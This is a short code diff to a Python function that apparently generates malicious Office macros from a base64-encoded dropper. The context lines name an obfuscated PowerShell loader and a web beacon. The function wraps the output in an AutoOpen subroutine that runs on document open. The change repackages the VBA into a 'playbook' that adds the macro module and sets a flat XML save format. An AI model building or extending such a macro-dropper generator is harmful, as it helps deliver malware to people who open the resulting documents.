@@ -3,6 +3,7 @@ import os
 import math
 
 def generate(dropperbase64):
+    playbook = list()
     utility_variables_list = ['powershell_var', 'final_deobf_destination', 'final_form', 'pschararray',
                               'webbeaconchecksum', 'webbeaconrequest', 'webbeaconurl', 'pingobj',
                               'networktest1', 'networktest2']
@@ -190,4 +191,8 @@ def generate(dropperbase64):
 
     vba = "Sub AutoOpen()\r\n" + vba + "End Sub"
 
-    return vba
+    playbook.append({'add_vba_module': vba})
+
+    playbook.append({'set_save_format': 'flatxml'})
+
+    return playbook
